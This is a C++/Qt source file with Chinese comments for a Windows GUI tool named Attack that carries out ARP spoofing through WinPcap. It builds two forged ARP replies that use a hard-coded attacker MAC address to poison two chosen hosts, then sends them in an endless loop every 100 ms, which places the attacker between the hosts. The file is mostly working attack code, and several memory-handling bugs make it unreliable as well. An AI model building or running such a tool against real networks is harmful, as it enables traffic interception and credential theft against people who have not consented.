#include "attack.h"
#include "ui_attack.h"

QList<QString> adress;

extern int dev_num;//当前监控的设备

Attack::Attack(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Attack)
{
    ui->setupUi(this);
}

Attack::~Attack()
{
    delete ui;
}

void Attack::on_pushButton_clicked()
{
    char *sip,*smac,*dip,*dmac;
    sip=get_mac_ip(1);
    smac=get_mac_ip(2);
    dip=get_mac_ip(3);
    dmac=get_mac_ip(4);
    cheating *arpcheat=new cheating();
    arpcheat->bf_run(sip,smac,dip,dmac);
    arpcheat->start();
}
void Attack::get_mac(QString mac,unsigned char *MAC)
{
    QStringList l = mac.split(".");
    int i = 0;
    QList<QString>::Iterator it = l.begin(),itend = l.end();
    while(it!=itend)
    {
        QString s = *it;
        bool ok;
        int hex = s.toInt(&ok,16);
        MAC[i] = hex;
        i++;
        it++;
    }
    return;
}

char * Attack::get_mac_ip(int a)
{
    switch (a){
    case 1:{
     char *sip=new char(4);
 //  sprintf(sip,"%c,%c,%c,%c",(ui->sIP_1->text()),(ui->sIP_2->text()),(ui->sIP_3->text()),(ui->sIP_4->text()));
     QString siptr1=ui->sIP_1->text();
     QString siptr2=ui->sIP_2->text();
     QString siptr3=ui->sIP_3->text();
     QString siptr4=ui->sIP_4->text();
     sip[0]=siptr1.toInt();
     sip[1]=siptr2.toInt();
     sip[2]=siptr3.toInt();
     sip[3]=siptr4.toInt();
   //  QString sIP=siptr1+siptr2+siptr3+siptr4;
    // QByteArray ba= sIP.toLatin1();
    // sip=ba.data();
    // qDebug("%s",sip);
      return sip;        }
    case 2:{
      char *smac=new char(6);
      QString sMac1=ui->sMAC_1->text();
      QString sMac2=ui->sMAC_2->text();
      QString sMac3=ui->sMAC_3->text();
      QString sMac4=ui->sMAC_4->text();
      QString sMac5=ui->sMAC_5->text();
      QString sMac6=ui->sMAC_6->text();
      QString sMAC=sMac1+"."+ sMac2+"."+sMac3+"."+sMac4+"."+sMac5+"."+sMac6;
      QByteArray ba= sMAC.toLatin1();
      smac=ba.data();
      get_mac(sMAC,(u_char*)smac);
      return smac;
    }
    case 3:{
       char *dip=new char(4);
      QString diptr1=ui->dIP_1->text();
      QString diptr2=ui->dIP_2->text();
      QString diptr3=ui->dIP_3->text();
      QString diptr4=ui->dIP_4->text();
      dip[0]=diptr1.toInt();
      dip[1]=diptr2.toInt();
      dip[2]=diptr3.toInt();
      dip[3]=diptr4.toInt();
   // QString dIP=diptr1+diptr2+diptr3+diptr4;
  //  QByteArray ba= dIP.toLatin1();
  //   dip=ba.data();
   //   qDebug("%d",dip[0]);
      return dip;

    }

    case 4:{
        char *dmac=new char(6);
        QString dMac1=ui->dMAC_1->text();
        QString dMac2=ui->dMAC_2->text();
        QString dMac3=ui->dMAC_3->text();
        QString dMac4=ui->dMAC_4->text();
        QString dMac5=ui->dMAC_5->text();
        QString dMac6=ui->dMAC_6->text();
        QString dMAC=dMac1+"."+ dMac2+"."+dMac3+"."+dMac4+"."+dMac5+"."+dMac6;
        QByteArray ca=dMAC.toLatin1();
        dmac=ca.data();
  //    qDebug("%s",dmac);
        get_mac(dMAC,(u_char*)dmac);
   //     qDebug("%d,%d,%d",dmac[0],dmac[1],dmac[2]);
        return dmac;

    }}


}

void cheating::run()
{
    pcap_if_t *d;
    pcap_if_t *alldevs;
    int inum;
    int i=0;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_int netmask1;

    /* 获取本机设备列表 */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        qDebug(errbuf);
        exit(1);
    }

    /* 打印列表 */
    for(d=alldevs; d; d=d->next)
    {
        qDebug("%d. %s", ++i, d->name);
        if (d->description)
            qDebug(" (%s)\n", d->description);
        else
            qDebug(" (No description available)\n");
    }

    if(i==0)
    {
        qDebug("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return ;
    }

    inum=dev_num;

    if(inum < 1 || inum > i)
    {
        qDebug("\nInterface number out of range.\n");
        /* 释放设备列表 */
        pcap_freealldevs(alldevs);
        return ;
    }

    /* 跳转到已选中的适配器 */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

    /* 打开设备 */
    if ( (adhandle= pcap_open(d->name,          // 设备名
                              65536,            // 要捕捉的数据包的部分
                                                // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
                              PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式
                              1000,             // 读取超时时间
                              NULL,             // 远程机器验证
                              errbuf            // 错误缓冲池
                              ) ) == NULL)
    {
        qDebug("\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        /* 释放设列表 */
        pcap_freealldevs(alldevs);
        return ;
    }

    /* 检查数据链路层，为了简单，我们只考虑以太网 */
    if(pcap_datalink(adhandle) != DLT_EN10MB)
    {
        qDebug("\nThis program works only on Ethernet networks.\n");
        /* 释放设备列表 */
        pcap_freealldevs(alldevs);
        return ;
    }

    if(d->addresses != NULL)
        /* 获得接口第一个地址的掩码 */
        netmask1=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
    else
        /* 如果接口没有地址，那么我们假设一个C类的掩码 */
        netmask1=0xffffff;
   qDebug()<<QByteArray::fromRawData((char *)arpreply,60).toHex()<<"  \n end \n";
   qDebug()<<QByteArray::fromRawData((char *)arpreply1,60).toHex()<<"  \n end \n";
   while(1){
 if(pcap_sendpacket( adhandle,             // Adapter
             (const u_char *)arpreply,     // buffer with the packet
             sizeof(arp_packet)               // size
             )==-1)
     qDebug("1");
 if(pcap_sendpacket( adhandle,             // Adapter
             (const u_char *)arpreply1,     // buffer with the packet
             sizeof(arp_packet)               // size
             )==-1)
     qDebug("2");
        msleep(100);
   }
}

//3C-95-09-B8-07-3B

void cheating::bf_run(char *sip,char *smac,char *dip,char *dmac)
{
          int i;
          for(i=0;i<6;i++){
          arpreply->eh.d_mac[i]=dmac[i];
         //  std::cout<<(dmac[i]);
          }
          arpreply->eh.s_mac[0]=0x3C;
          arpreply->eh.s_mac[1]=0x95;
          arpreply->eh.s_mac[2]=0x09;
          arpreply->eh.s_mac[3]=0xB8;
          arpreply->eh.s_mac[4]=0x07;
          arpreply->eh.s_mac[5]=0x3B;
          arpreply->eh.type=htons((unsigned short)0x0806);
          arpreply->ah.ea_hdr.ar_hrd= htons((unsigned short)0x0001);
          arpreply->ah.ea_hdr.ar_pro=htons((unsigned short)0x0800);
          arpreply->ah.ea_hdr.ar_hln=(unsigned char)6;
          arpreply->ah.ea_hdr.ar_pln= (unsigned char)4;
          arpreply->ah.ea_hdr.ar_op= htons((unsigned short)2);
         // arpreply->ah.arp_sha=;//本机MAC;
          arpreply->ah.arp_sha[0]=0x3C;
          arpreply->ah.arp_sha[1]=0x95;
          arpreply->ah.arp_sha[2]=0x09;
          arpreply->ah.arp_sha[3]=0xB8;
          arpreply->ah.arp_sha[4]=0x07;
          arpreply->ah.arp_sha[5]=0x3B;
            for(i=0;i<4;i++)
          arpreply->ah.arp_spa[i]=sip[i];
            for(i=0;i<6;i++)
          arpreply->ah.arp_tha[i]=dmac[i];
            for(i=0;i<4;i++)
          arpreply->ah.arp_tpa[i]=dip[i];

       // arpreply1->eh.s_mac=;//本机MAC;
            arpreply1->eh.s_mac[0]=0x3C;
            arpreply1->eh.s_mac[1]=0x95;
            arpreply1->eh.s_mac[2]=0x09;
            arpreply1->eh.s_mac[3]=0xB8;
            arpreply1->eh.s_mac[4]=0x07;
            arpreply1->eh.s_mac[5]=0x3B;



   //       arpreply1->eh.d_mac=smac;
            for(i=0;i<6;i++)
            arpreply1->eh.d_mac[i]=smac[i];

            arpreply1->eh.type=htons((unsigned short)0x0806);
            arpreply1->ah.ea_hdr.ar_hrd= htons((unsigned short)0x0001);
            arpreply1->ah.ea_hdr.ar_pro=htons((unsigned short)0x0800);
            arpreply1->ah.ea_hdr.ar_hln=(unsigned char)6;
            arpreply1->ah.ea_hdr.ar_pln= (unsigned char)4;
            arpreply1->ah.ea_hdr.ar_op= htons((unsigned short)2);
      //    arpreply1->ah.arp_sha=//本机MAC;
            arpreply1->ah.arp_sha[0]=0x3C;
            arpreply1->ah.arp_sha[1]=0x95;
            arpreply1->ah.arp_sha[2]=0x09;
            arpreply1->ah.arp_sha[3]=0xB8;
            arpreply1->ah.arp_sha[4]=0x07;
            arpreply1->ah.arp_sha[5]=0x3B;
             for(i=0;i<4;i++)
            arpreply1->ah.arp_spa[i]=dip[i];
              for(i=0;i<6;i++)
            arpreply1->ah.arp_tha[i]=smac[i];
               for(i=0;i<4;i++)
            arpreply1->ah.arp_tpa[i]=sip[i];


}
